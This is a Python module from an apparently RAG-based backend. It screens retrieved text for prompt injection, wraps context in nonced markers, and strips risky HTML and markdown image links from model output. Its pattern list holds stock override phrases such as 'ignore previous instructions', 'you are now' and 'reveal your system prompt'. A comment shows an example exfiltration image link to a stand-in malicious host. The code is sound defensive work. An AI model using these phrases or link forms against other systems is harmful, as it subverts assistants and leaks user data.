import re
import uuid
import logging
from typing import List, Tuple, Dict, Any
from backend.app.config import settings

logger = logging.getLogger(__name__)


class PromptShield:
    """Detects and neutralizes prompt injection attempts, adds dynamic nonced boundary markers, and sanitizes model output."""

    # Common injection patterns
    INJECTION_PATTERNS = [
        re.compile(r'ignore\s+(previous|all)\s+instructions', re.IGNORECASE),
        re.compile(r'system\s+prompt', re.IGNORECASE),
        re.compile(r'you\s+are\s+now\s+(an?\s+)?', re.IGNORECASE),
        re.compile(r'reveal\s+(your\s+)?(system\s+prompt|instructions|secret)', re.IGNORECASE),
        re.compile(r'exfiltrate', re.IGNORECASE),
        re.compile(r'markdown\s+image\s+.*http', re.IGNORECASE),
    ]

    @classmethod
    def detect_injection(cls, text: str) -> bool:
        if not text or settings.PROMPT_INJECTION_MODE == "off":
            return False
        for pattern in cls.INJECTION_PATTERNS:
            if pattern.search(text):
                return True
        return False

    @classmethod
    def shield_chunk(cls, text: str) -> Tuple[str, bool]:
        """Inspects chunk text for prompt injection. Applies mode: off, flag, neutralize, block."""
        if not text:
            return "", False

        is_injected = cls.detect_injection(text)
        mode = settings.PROMPT_INJECTION_MODE

        if is_injected:
            if mode == "block":
                logger.warning("Prompt injection detected in chunk. Mode is 'block' — excluding chunk.")
                return "", True
            elif mode == "neutralize":
                # Neutralize pattern matches
                neutralized = text
                for pattern in cls.INJECTION_PATTERNS:
                    neutralized = pattern.sub("[NEUTRALIZED_INJECTION_ATTEMPT]", neutralized)
                return neutralized, True
            elif mode == "flag":
                logger.warning("Prompt injection detected in chunk. Mode is 'flag' — annotating chunk.")
                return f"[WARNING: Potential Prompt Injection Detected] {text}", True

        # Also escape any lookalikes of context boundary markers
        escaped = text.replace("--- RETRIEVED CONTEXT", "--- [ESCAPED_BOUNDARY] RETRIEVED CONTEXT")
        return escaped, is_injected

    @classmethod
    def build_shielded_context(cls, chunks: List[Dict[str, Any]]) -> Tuple[str, str, List[Dict[str, Any]]]:
        """Constructs nonced context block and shields individual chunks."""
        nonce = uuid.uuid4().hex[:8]
        start_marker = f"--- BEGIN RETRIEVED CONTEXT [NONCE:{nonce}] ---"
        end_marker = f"--- END RETRIEVED CONTEXT [NONCE:{nonce}] ---"

        shielded_passages = []
        metadata_annotations = []

        for idx, chunk in enumerate(chunks, 1):
            raw_text = chunk.get("text", "")
            shielded_text, injected = cls.shield_chunk(raw_text)
            if not shielded_text and settings.PROMPT_INJECTION_MODE == "block":
                continue

            passage = f"[{idx}] {shielded_text}"
            shielded_passages.append(passage)
            metadata_annotations.append({
                "chunk_id": chunk.get("chunk_id"),
                "injected_flag": injected
            })

        context_body = "\n\n".join(shielded_passages)
        full_context = f"{start_marker}\n{context_body}\n{end_marker}"
        return full_context, nonce, metadata_annotations

    @classmethod
    def sanitize_output(cls, output_text: str) -> str:
        """Sanitizes model output to prevent raw HTML execution or markdown/image data exfiltration."""
        if not output_text:
            return ""

        # Strip risky raw HTML tags like <script>, <iframe>, <object>
        sanitized = re.sub(r'<(script|iframe|object|embed|form|input)[^>]*>.*?</\1>', '', output_text, flags=re.IGNORECASE | re.DOTALL)
        sanitized = re.sub(r'<(script|iframe|object|embed|form|input)[^>]*/>', '', sanitized, flags=re.IGNORECASE)

        # Neutralize suspicious markdown image exfiltration links containing local sensitive parameters
        # e.g. ![](http://malicious.com/log?...)
        sanitized = re.sub(r'!\[([^\]]*)\]\((https?://[^\)]+)\)', r'[Image Exfiltration Link Blocked: \1]', sanitized)

        return sanitized
